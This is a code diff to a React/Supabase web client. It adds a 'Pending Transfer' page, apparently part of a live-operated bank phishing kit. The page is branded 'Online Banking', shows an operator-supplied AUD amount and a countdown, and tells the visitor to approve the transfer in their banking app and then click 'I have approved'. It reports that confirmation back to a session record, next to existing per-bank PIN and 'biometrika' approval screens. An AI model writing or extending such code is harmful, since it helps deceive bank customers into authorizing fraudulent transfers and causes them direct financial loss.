@@ -20,6 +20,7 @@ type ApprovalViewState = {
   message: string;
   imageUrl: string | null;
   lang: ApprovalLang;
+  transferAmount: string;
 };
 
 const APPROVAL_LABELS: Record<string, string> = {
@@ -291,6 +292,88 @@ function BiometricApprovalCard({
   );
 }
 
+function TransferApprovalCard({
+  amount,
+  secondsLeft,
+  saving,
+  onConfirm,
+}: {
+  amount: string;
+  secondsLeft: number;
+  saving: boolean;
+  onConfirm: () => void;
+}) {
+  const mm = Math.floor(secondsLeft / 60);
+  const ss = secondsLeft % 60;
+  const displayAmount = amount.trim();
+
+  return (
+    <div className="pak-page-shell">
+      <div className="pak-form-card w-full max-w-[560px]">
+        <div className="pak-form-inner px-5 py-6 text-center sm:px-8 sm:py-8">
+          <p className="pak-eyebrow">Online Banking</p>
+          <h1 className="pak-form-title mt-3 text-[2rem] sm:text-[2.5rem]">Pending Transfer</h1>
+
+          {/* Buyuk AUD$ tutar kutusu */}
+          <div className="mx-auto mb-6 mt-4 flex h-24 w-24 items-center justify-center rounded-[14px] bg-[#0C7A3E] text-[1.75rem] font-bold tracking-tight text-white">
+            {displayAmount ? `$${displayAmount}` : "$"}
+          </div>
+
+          <div className="mx-auto grid max-w-[460px] grid-cols-3 items-center gap-2 rounded-[10px] bg-[#f6fbff] px-3 py-4 text-left sm:px-5">
+            <div className="border-r border-black/5 pr-3">
+              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Status</p>
+              <div className="mt-1 flex items-center gap-2">
+                <span className="h-3 w-3 animate-pulse rounded-full bg-[#ef9b23]" />
+                <span className="text-[12px] font-semibold text-[#27324a]">Waiting</span>
+              </div>
+            </div>
+            <div className="border-r border-black/5 px-3">
+              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Action</p>
+              <p className="mt-1 text-[12px] font-semibold text-[#27324a]">Approve transfer</p>
+            </div>
+            <div className="pl-3">
+              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Currency</p>
+              <p className="mt-1 text-[12px] font-semibold text-[#27324a]">AUD Dollar</p>
+            </div>
+          </div>
+
+          <p className="mt-4 text-[13px] font-medium text-[#55607d]">
+            A transfer of{" "}
+            <span className="font-semibold text-[#1d2a45]">
+              {displayAmount ? `A$ ${displayAmount}` : "the required amount"}
+            </span>{" "}
+            is pending. To complete this transfer, approve it in your banking app, then confirm here.
+          </p>
+
+          <div className="mt-5 flex items-center justify-center gap-2">
+            <div className="flex h-7 w-7 items-center justify-center rounded-full border-2 border-[#cdd8ef]">
+              <svg className="h-3.5 w-3.5 text-[#8ba3d9]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2}>
+                <path d="M12 6v6l4 2" strokeLinecap="round" strokeLinejoin="round" />
+              </svg>
+            </div>
+            <span className="text-[26px] font-semibold tracking-[0.04em] text-[#1d2a45]">
+              {String(mm).padStart(2, "0")}:{String(ss).padStart(2, "0")}
+            </span>
+          </div>
+
+          <div className="mx-auto mt-5 max-w-[480px] rounded-[6px] bg-[#e4f3ee] px-4 py-3 text-[12.5px] font-medium leading-5 text-[#175c48]">
+            Keep your banking app open — the approval request may take a moment to appear.
+          </div>
+
+          <button
+            type="button"
+            onClick={onConfirm}
+            disabled={saving}
+            className="mt-5 w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
+          >
+            {saving ? "Confirming..." : "I have approved"}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
 function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
   const { settings } = useSettings();
   return (
@@ -351,6 +434,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     message: "Please wait...",
     imageUrl: null,
     lang: "en",
+    transferAmount: "",
   });
 
   useEffect(() => {
@@ -393,6 +477,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         message: fd.specialNoticeText ?? fd.customMessage ?? "Please wait...",
         imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
         lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "en",
+        transferAmount: fd.transferAmount?.trim() ?? "",
       });
       setReady(true);
     };
@@ -429,9 +514,10 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     setSaving(true);
     const { data: existing } = await supabase.from("sessions").select("*").eq("id", effectiveSessionId).maybeSingle();
     const previousFormData = ((existing?.form_data ?? {}) as Record<string, string | undefined>) ?? {};
+    const confirmedStatus = `${viewState.approvalStatus}_confirmed`;
     const nextApprovalHistory = [
       ...parseApprovalHistory(previousFormData.approvalHistory),
-      viewState.approvalStatus,
+      confirmedStatus,
     ].filter((item) => item && item.trim().length > 0);
 
     const { error } = await supabase
@@ -441,7 +527,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         current_step: "wait",
         form_data: {
           ...previousFormData,
-          approvalStatus: viewState.approvalStatus,
+          approvalStatus: confirmedStatus,
           approvalCode: viewState.approvalCode,
           approvalHistory: JSON.stringify(nextApprovalHistory),
         },
@@ -500,6 +586,17 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         pinLabel={viewState.approvalStatus === "biometrika_pin_2" ? "PIN2" : "PIN1"}
         bankSlug={viewState.bankSlug}
         bankName={viewState.bankName}
+        onConfirm={() => void handleApprovalSubmit()}
+      />
+    );
+  }
+
+  if (viewState.approvalStatus === "transfer") {
+    return (
+      <TransferApprovalCard
+        amount={viewState.transferAmount}
+        secondsLeft={secondsLeft}
+        saving={saving}
         onConfirm={() => void handleApprovalSubmit()}
       />
     );
